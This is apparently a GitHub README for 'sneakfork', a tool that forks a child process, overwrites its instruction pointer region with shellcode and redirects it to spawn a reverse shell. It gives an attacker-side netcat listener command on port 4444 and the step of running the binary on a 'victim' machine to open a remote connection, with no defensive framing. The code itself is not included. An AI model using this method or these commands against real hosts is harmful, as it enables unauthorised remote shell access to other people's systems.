_____________________________________________
![maxresdefault](https://github.com/user-attachments/assets/ce0a2a3d-0d8c-451a-ab1f-50de33f70bff)
______________________________________________
# sneakfork
sneakfork is able to change its process memory, registers and change its execution flow.

## Working 
1. sneakfork create a child process with the <code>fork()</code> syscall.
2. rewrite existing bytes of RIP in child with shellcode.
3. redirect its execution flow using <code>execv()</code> towards <code>/bin/bash</code>.

## Testing 
lunch revshell listener at port 4444:
```bash
attacker:$ nc -lnvp 4444 
```
launch sneakfork on victims machine:
```bash
victim:$ ./sneakfork
```
We have currently established a TCP connection to victim machine.

## License
This project is licensed under [MIT](https://github.com/0x00snape/sneakfork/blob/main/LICENSE)

